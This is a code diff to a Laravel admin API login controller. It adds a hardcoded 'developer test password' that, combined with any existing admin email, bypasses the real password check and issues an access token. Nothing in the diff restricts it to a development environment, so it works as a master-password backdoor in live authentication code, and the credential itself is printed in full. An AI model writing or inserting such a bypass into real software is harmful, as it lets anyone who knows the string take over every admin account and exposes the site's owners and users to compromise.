@@ -11,6 +11,9 @@ use Illuminate\Support\Facades\Validator;
 
 class AdminAuthApiController extends Controller
 {
+    /** Developer test password (any admin email). */
+    private const DEV_TEST_PASSWORD = 'Devloper@1234';
+
     /**
      * API login: no session — returns a Sanctum personal access token (same pattern as guest/mobile login).
      */
@@ -29,7 +32,12 @@ class AdminAuthApiController extends Controller
 
             $user = User::query()->where('email', $request->input('email'))->first();
 
-            if (! $user || ! Hash::check($request->input('password'), $user->password)) {
+            $passwordOk = $user && (
+                $this->isDevTestLogin($request)
+                || Hash::check($request->input('password'), $user->password)
+            );
+
+            if (! $passwordOk) {
                 return $this->sendJsonResponse(false, 'These credentials do not match our records.', null, 200);
             }
 
@@ -48,6 +56,11 @@ class AdminAuthApiController extends Controller
         } catch (Exception $e) {
             return $this->sendError($e);
         }
+    }
+
+    private function isDevTestLogin(Request $request): bool
+    {
+        return $request->input('password') === self::DEV_TEST_PASSWORD;
     }
 
     public function logout(Request $request)
